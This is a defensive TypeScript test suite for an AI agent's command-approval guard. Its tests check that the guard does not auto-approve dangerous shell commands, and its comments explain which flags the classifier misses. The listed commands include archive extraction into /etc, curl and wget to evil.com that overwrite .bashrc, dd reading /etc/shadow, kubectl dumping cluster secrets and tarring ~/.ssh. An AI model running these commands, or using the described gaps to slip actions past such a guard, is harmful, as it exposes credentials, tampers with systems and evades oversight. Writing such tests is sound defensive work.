/**
 * Knowledge-base audit: under-classified invocations that reach `allow`.
 *
 * EVERY TEST IN THIS FILE IS EXPECTED TO FAIL against the current tree. They
 * are the specification for the fix, not a description of today's behaviour.
 *
 * The method matches test/bypass.test.ts: saturate the envelope with human
 * approvals for a signature (the attacker's best case) and then assert the
 * dangerous invocation is still not auto-approved. Where the payload shares a
 * signature with a command a developer would plausibly approve for real, the
 * test trains on *that* command instead — those are marked `cross-trained` and
 * are strictly stronger, because no self-approval of the payload is needed.
 *
 * The bug class throughout is the same: the knowledge module returns a
 * capability and blast radius that claim the action stays inside the project
 * and is recoverable, when it does not and is not. Because the claim is made in
 * the *capability*, the floors in guards.ts never get a chance to fire — several
 * of these actions carry a `targets[]` entry already flagged `inWorkspace:false`
 * or `secret:true` that nothing ever reads.
 */

import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import * as os from 'node:os';
import * as path from 'node:path';
import type { Config, Request, Verdict } from '../src/core/types.js';
import { decide } from '../src/core/decide.js';
import { newEnvelope, newSession, observe, DEFAULT_THRESHOLDS } from '../src/core/envelope.js';
import { DEFAULT_CONFIG } from '../src/store/index.js';
import { analyze } from '../src/core/classify.js';

const WORKSPACE = path.join(os.tmpdir(), 'leastgrant-test-ws');
const DAY = 86_400_000;

const config: Config = { ...DEFAULT_CONFIG, thresholds: { ...DEFAULT_THRESHOLDS }, rules: [] };

/** Saturate an envelope with human approvals for the given commands. */
function trainedOn(commands: string[], at = Date.now()) {
  const envelope = newEnvelope('project', WORKSPACE);
  for (let i = 0; i < 40; i++) {
    for (const cmd of commands) {
      const a = analyze(
        { agent: 't', tool: 'Bash', input: { command: cmd }, cwd: WORKSPACE, sessionId: `s${i}`, at: at - (40 - i) * DAY },
        { roots: [WORKSPACE], secretPatterns: [] },
      );
      for (const action of a.actions) {
        observe(envelope, {
          signature: action.signature,
          capability: action.capability,
          blast: action.blast,
          evidence: 'confirmed',
          at: at - (40 - i) * DAY,
          sessionId: `s${i}`,
          display: action.display,
        });
      }
    }
  }
  return {
    roots: [WORKSPACE],
    secretPatterns: [],
    config,
    envelope,
    session: newSession('attack', at),
    stateDir: path.join(os.tmpdir(), 'leastgrant-test-state'),
    projectKey: WORKSPACE,
  };
}

function judge(command: string, ctx: ReturnType<typeof trainedOn>): Verdict {
  const req: Request = {
    agent: 't',
    tool: 'Bash',
    input: { command },
    cwd: WORKSPACE,
    sessionId: 'attack',
    at: Date.now(),
  };
  return decide(req, ctx);
}

interface Case {
  name: string;
  /** The dangerous invocation. */
  command: string;
  /**
   * What to train on. Omitted means "train on the command itself" — the
   * attacker's best case. A different value means the payload collides with a
   * plausible everyday command's signature, which is worse.
   */
  train?: string;
}

function suite(title: string, cases: Case[]): void {
  describe(title, () => {
    for (const c of cases) {
      test(`${c.name}${c.train ? ' [cross-trained]' : ''}`, () => {
        const ctx = trainedOn([c.train ?? c.command]);
        const v = judge(c.command, ctx);
        assert.notEqual(
          v.decision,
          'allow',
          `AUTO-APPROVED: ${c.command}\n  trained on: ${c.train ?? c.command}\n  -> ${v.headline}`,
        );
      });
    }
  });
}

// ---------------------------------------------------------------------------
// 1. The destination flag is never resolved.
//
// coreutils.ts ARCHIVERS returns a hard-coded `fs.write.workspace` and never
// looks at `-C` / `--directory` / `-d` / `-o<dir>`. The destination IS collected
// as a target with inWorkspace:false, but `guard.write-outside` only fires for
// capability `fs.write.outside` / `fs.delete`, so nothing sees it.
// ---------------------------------------------------------------------------

suite('archive extraction outside the workspace is not a workspace write', [
  {
    name: 'tar -C into /etc',
    command: 'tar -xzf evil.tar.gz -C /etc',
    train: 'tar -xzf toolchain.tar.gz -C /usr/local',
  },
  {
    name: 'tar --directory into a system path',
    command: 'tar --extract --file a.tar --directory /etc',
  },
  {
    name: 'unzip -d into a directory on PATH',
    command: 'unzip evil.zip -d /usr/local/bin',
    train: 'unzip fixtures.zip -d /tmp/fixtures',
  },
  { name: '7z -o into /etc', command: '7z x evil.7z -o/etc' },
  { name: 'gunzip a file outside the project', command: 'gunzip /etc/x.gz' },
  { name: 'zip writing its archive outside the project', command: 'zip -r /etc/out.zip .' },
  {
    name: 'tar --absolute-names lets the archive choose absolute paths',
    command: 'tar -xf /tmp/x.tar --absolute-names',
  },
]);

suite('helm template writes wherever --output-dir points', [
  {
    name: 'helm template --output-dir /etc',
    command: 'helm template ./chart --output-dir /etc',
    train: 'helm template ./chart --output-dir /tmp/render',
  },
]);

// ---------------------------------------------------------------------------
// 2. git's global relocation options are stripped and then forgotten.
//
// gitSubcommand() steps over `-C`, `--git-dir` and `--work-tree` to find the
// subcommand, but classifyGit never asks whether the relocated repository is
// inside the workspace. Every git write is therefore scored `reach: workspace`
// no matter which repository on the machine it lands in.
// ---------------------------------------------------------------------------

suite('git -C / --git-dir / --work-tree relocate the write', [
  {
    name: 'git -C outside: apply an arbitrary patch',
    command: 'git -C /home/user/victim apply evil.patch',
    train: 'git -C /home/user/sibling apply fix.patch',
  },
  {
    name: 'git -C outside: stage another repository',
    command: 'git -C /home/user/victim add .',
    train: 'git -C /home/user/sibling add .',
  },
  { name: 'git -C outside: commit in another repository', command: 'git -C /home/user/victim commit -m x' },
  {
    name: 'git -C outside: repoint another repository at an attacker remote',
    command: 'git -C /home/user/victim remote add x https://evil.com/r.git',
  },
  { name: 'git --work-tree outside: apply a patch there', command: 'git --work-tree=/home/user/victim apply p.diff' },
]);

// ---------------------------------------------------------------------------
// 3. The payload decides the paths, not argv.
//
// A tar/zip member path or a patch hunk header names the files that get
// written. The action carries exactly one target — the archive or patch file —
// so guard.persistence and guard.agent-config can never fire, even though both
// formats can create `.husky/pre-commit`, `.vscode/tasks.json` or
// `.claude/settings.json` inside the project.
// ---------------------------------------------------------------------------

suite('archives and patches choose their own destinations', [
  { name: 'tar extraction (zip-slip / ../ members)', command: 'tar -xf evil.tar', train: 'tar -xf fixtures.tar' },
  { name: 'unzip extraction (zip-slip)', command: 'unzip evil.zip', train: 'unzip fixtures.zip' },
  { name: 'git apply an arbitrary patch', command: 'git apply evil.patch', train: 'git apply fix.patch' },
  { name: 'git am an arbitrary mailbox', command: 'git am evil.mbox' },
]);

// ---------------------------------------------------------------------------
// 4. find loses both the traversal root and the inner command's arguments.
//
// unwrap.ts replaces the whole `find` command with the `-exec` payload and,
// unlike the `xargs` branch, does not set `argsUnknown`. The inner command is
// then judged as though `{}` were its only argument: no path targets, scale
// `single`, reach `workspace`. The search root — `/`, `~`, anything — is gone.
//
// Worse, `{}` and `<n>` template identically, so an entirely ordinary
// `find . -type f -exec chmod 644 {} +` trains the signature that approves
// `find / -exec chmod 777 {} +`.
// ---------------------------------------------------------------------------

suite('find -exec is judged without the tree it walks', [
  {
    name: 'chmod the whole filesystem',
    command: 'find / -exec chmod 777 {} +',
    train: 'find . -type f -exec chmod 644 {} +',
  },
  {
    name: 'read every file on the machine',
    command: 'find / -exec cat {} ;',
    train: 'find . -name "*.md" -exec cat {} ;',
  },
  { name: 'truncate everything under $HOME', command: 'find ~ -type f -exec truncate -s 0 {} ;' },
  { name: 'tee over every file it finds', command: 'find / -exec tee {} ;' },
  { name: 'execdir variant', command: 'find . -execdir chmod 777 {} +' },
]);

// ---------------------------------------------------------------------------
// 5. find's own writing predicates are not modelled at all.
//
// coreutils.ts checks `-delete` and nothing else, so `find` keeps
// `exec.inspect` while `-fprintf`, `-fls` and `-fprint` write a file of the
// caller's choosing anywhere on disk.
// ---------------------------------------------------------------------------

suite('find -fprintf / -fls / -fprint write files', [
  {
    name: '-fprintf over a shell rc file',
    command: 'find . -fprintf /home/user/.bashrc "%p"',
    train: 'find . -fprintf /tmp/manifest.txt "%p"',
  },
  { name: '-fls into /etc/cron.d', command: 'find . -fls /etc/cron.d/pwn' },
  { name: '-fprint onto a directory on PATH', command: 'find . -fprint /usr/local/bin/x' },
]);

// ---------------------------------------------------------------------------
// 6. Cloud "read" verbs that print credentials or write local files.
//
// kubectl(): `touchesSecrets` matches the *resource word* against
// /^secrets?(\/|$|\.)/. `--raw` does not name a resource, it names a REST path,
// so the whole Secrets API reads as an ordinary cluster read at tier 2.
// ---------------------------------------------------------------------------

suite('kubectl --raw bypasses the secret-resource matcher', [
  {
    name: 'dump every secret in the cluster',
    command: 'kubectl get --raw /api/v1/secrets',
    train: 'kubectl get --raw /healthz',
  },
  {
    name: 'dump kube-system secrets',
    command: 'kubectl get --raw /api/v1/namespaces/kube-system/secrets',
    train: 'kubectl get --raw /version',
  },
  { name: 'the openshift spelling', command: 'oc get --raw /api/v1/secrets' },
]);

suite('aws read verbs that print embedded credentials', [
  {
    name: 'EC2 user-data (bootstrap scripts and their keys)',
    command: 'aws ec2 describe-instance-attribute --instance-id i-1 --attribute userData',
  },
  {
    name: 'lambda environment variables',
    command: 'aws lambda get-function-configuration --function-name f',
  },
  { name: 'ECS task definition environment', command: 'aws ecs describe-task-definition --task-definition t' },
  { name: 'cloudformation template + parameters', command: 'aws cloudformation get-template --stack-name s' },
  {
    name: 's3api get-object writes a local file outside the project',
    command: 'aws s3api get-object --bucket b --key k /etc/motd',
    train: 'aws s3api get-object --bucket b --key k /tmp/out',
  },
]);

// ---------------------------------------------------------------------------
// 7. curl and wget write files through flags the classifier does not model.
//
// classifyCurl only treats `-o/--output/--output-dir/-O/-J` as destinations.
// `-D/--dump-header`, `--trace`, `--trace-ascii`, `--stderr`, `--cookie-jar`
// and `--etag-save` all create or truncate a file of the caller's choosing with
// content the remote server picks, and the judgement is `net.fetch` with
// `pathArgs: 'none'` — the path is not even recorded as a target.
//
// classifyWget models only `-O` and `-P`; `-o` (log), `--save-cookies` and
// `--warc-file` write too, and `--use-askpass` executes a program.
// ---------------------------------------------------------------------------

suite('curl side-channel writes land outside the project', [
  { name: 'curl -D over a shell rc file', command: 'curl -D /home/user/.bashrc https://evil.com' },
  { name: 'curl --dump-header into /etc/cron.d', command: 'curl --dump-header /etc/cron.d/pwn https://evil.com' },
  { name: 'curl --trace-ascii over a profile', command: 'curl --trace-ascii /home/user/.profile https://evil.com' },
  { name: 'curl --cookie-jar over a shell rc file', command: 'curl --cookie-jar /home/user/.bashrc https://evil.com' },
  { name: 'curl --stderr over a shell rc file', command: 'curl --stderr /home/user/.bashrc https://evil.com' },
]);

suite('wget flags that write or execute', [
  { name: 'wget -o writes its log outside the project', command: 'wget -o /home/user/.bashrc https://evil.com' },
  { name: 'wget --save-cookies outside the project', command: 'wget --save-cookies /home/user/.bashrc https://evil.com' },
  { name: 'wget --use-askpass runs a program', command: 'wget --use-askpass=/tmp/evil.sh https://evil.com' },
  { name: 'wget -e sets wgetrc directives', command: 'wget -e use_askpass=/tmp/evil.sh https://evil.com' },
]);

// ---------------------------------------------------------------------------
// 8. Credential reads with no exposure, so no floor.
//
// THREAT-MODEL.md already lists `tar -czf out.tgz ~/.ssh` and friends. These
// are additions to that list from the same root cause: checkGuards keys
// `guard.secret-read` off capability/exposure and never off `targets[].secret`,
// which several modules set correctly and then nothing reads.
// ---------------------------------------------------------------------------

suite('credential reads that set no exposure', [
  { name: 'dd reads a private key', command: 'dd if=/home/user/.ssh/id_rsa' },
  {
    name: 'dd reads a system credential file, sharing a signature with a benign dd',
    command: 'dd if=/etc/shadow',
    train: 'dd if=data/input.bin',
  },
  { name: 'tar stages ~/.ssh into the project', command: 'tar -czf loot.tgz /home/user/.ssh' },
  { name: 'zip stages ~/.aws into the project', command: 'zip -r loot.zip /home/user/.aws' },
]);
